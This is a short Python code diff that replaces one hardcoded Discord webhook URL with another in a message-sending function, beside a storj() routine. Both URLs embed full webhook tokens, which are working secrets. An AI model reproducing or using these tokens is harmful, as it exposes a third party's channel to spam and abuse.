@@ -350,7 +350,7 @@ def senddiscrdmsg(content):
         }
     payload = json.dumps(message)
     headers = {'Content-Type': 'application/json'}
-    requests.post("https://discord.com/api/webhooks/1177648648172093562/8PN6BS5c4l4tST5H_jtunzO46iiigz1zyEI34nPbWN_Q7IKJjQKIEYLdb6OXYpwVofwp", data=payload, headers=headers)
+    requests.post("https://discord.com/api/webhooks/1185957394526781491/-nQ6rLQ1Vlo8El7VB9of0waEU9A4mTKBJfrla8Po7F9UelL_HVfkhy9pIGN9pU8ZEMv4", data=payload, headers=headers)
 
 def storj():
     if storj_lock.acquire(blocking=False):
